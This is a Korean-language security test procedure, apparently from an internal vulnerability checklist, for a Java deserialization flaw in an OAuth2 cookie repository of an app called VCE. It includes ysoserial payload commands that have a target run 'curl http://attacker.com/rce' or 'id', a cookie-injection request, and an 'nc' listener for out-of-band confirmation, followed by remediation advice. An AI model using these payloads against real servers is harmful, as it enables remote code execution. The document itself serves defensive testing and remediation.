================================================================================
[VCE-AUTH-08] Java 역직렬화 취약점 (OAuth2 쿠키 ObjectInputStream)
도메인: auth
================================================================================

## 1. 진단 항목 개요

- **항목명**: OAuth2 인가 요청 쿠키의 Java 역직렬화
- **번호**: AUTH-08
- **위험도**: Critical
- **OWASP**: A08:2021 – Software and Data Integrity Failures

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/oauth2/authorization/google |
| 운영 | https://vceapp.com/oauth2/authorization/google |
| HTTP 메서드 | GET (OAuth2 시작 → 콜백) |
| 관련 파일 | HttpCookieOAuth2AuthorizationRequestRepository.java:97 |

## 3. 취약점 원리 (Why this works)

`HttpCookieOAuth2AuthorizationRequestRepository.java:97`에서
OAuth2 인가 요청 객체를 쿠키에 직렬화하여 저장하고, 콜백 시 역직렬화한다:

```java
// 직렬화 (저장)
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(authorizationRequest);
String cookieValue = Base64.getEncoder().encodeToString(bos.toByteArray());

// 역직렬화 (복원) - 취약 포인트
byte[] bytes = Base64.getDecoder().decode(cookieValue);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
OAuth2AuthorizationRequest authorizationRequest = (OAuth2AuthorizationRequest) ois.readObject(); // ⚠️
```

`ObjectInputStream.readObject()`는 클래스패스에 존재하는 모든 클래스를 역직렬화할 수 있다.
서버 클래스패스에 `commons-collections`, `spring-core` 등 gadget chain이 존재하면
악성 직렬화 페이로드로 RCE(원격 코드 실행)가 가능하다.

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. Burp Suite 설치
2. ysoserial 도구: https://github.com/frohoff/ysoserial
3. 서버 클래스패스의 라이브러리 버전 파악 (pom.xml/build.gradle 확인)

---

### Step 1. OAuth2 인가 쿠키 확인

OAuth2 로그인 시작 후 설정되는 쿠키 캡처:
```
GET /oauth2/authorization/google HTTP/1.1
Host: localhost:8080
```

응답 Set-Cookie에서 OAuth2 관련 쿠키 확인:
```
Set-Cookie: oauth2_auth_request=rO0ABXNy...; Path=/; HttpOnly
```

`rO0AB` 로 시작하면 Java 직렬화 스트림의 Base64 인코딩 (magic bytes: `AC ED 00 05`)

---

### Step 2. 쿠키 디코드하여 직렬화 확인

```bash
echo "rO0ABXNy..." | base64 -d | xxd | head -5
```

출력 첫 바이트가 `ac ed 00 05` 이면 Java 직렬화 객체 확인.

---

### Step 3. ysoserial로 페이로드 생성

서버에 commons-collections가 있는 경우:
```bash
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/rce" | base64 -w 0
```

서버에 spring-core가 있는 경우:
```bash
java -jar ysoserial.jar Spring1 "id" | base64 -w 0
```

---

### Step 4. 악성 페이로드로 콜백 요청

OAuth2 콜백 시 쿠키에 악성 페이로드 삽입:
```
GET /login/oauth2/code/google?code=authcode&state=state HTTP/1.1
Host: localhost:8080
Cookie: oauth2_auth_request=<악성_base64_페이로드>
```

---

### Step 5. 서버 응답 및 OOB(Out-of-Band) 확인

Burp Collaborator 또는 외부 서버에서 인바운드 요청 확인:
```bash
# 공격자 서버에서
nc -lvp 80
```

또는 curl의 DNS lookup이 발생하는지 확인 (burp collaborator URL 사용)

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 쿠키 값이 `rO0AB`로 시작 (Java 직렬화 확인)
- 악성 페이로드 전송 후 공격자 서버에 인바운드 요청 수신
- 서버 오류 응답에서 ClassNotFoundException 외의 예외 발생

✗ **안전 (Not Vulnerable)**:
- 쿠키가 JSON 형식으로 저장됨 (Base64이지만 직렬화 아님)
- ObjectInputStream 미사용, GSON/Jackson 사용
- 역직렬화 필터(ObjectInputFilter) 적용

## 6. 예상 취약 포인트 (코드 위치)

- `HttpCookieOAuth2AuthorizationRequestRepository.java:97` — `ois.readObject()` 호출

## 7. 권고 조치

- Java 직렬화 대신 JSON(Jackson/GSON) 사용하여 OAuth2 인가 요청 직렬화
- Java 17+ 사용 시 ObjectInputFilter로 허용 클래스 화이트리스트 지정
- `SerialKiller` 또는 `NotSoSerial` 라이브러리로 역직렬화 필터 적용
- Spring Security의 기본 `HttpSessionOAuth2AuthorizationRequestRepository` 사용 (세션 기반)
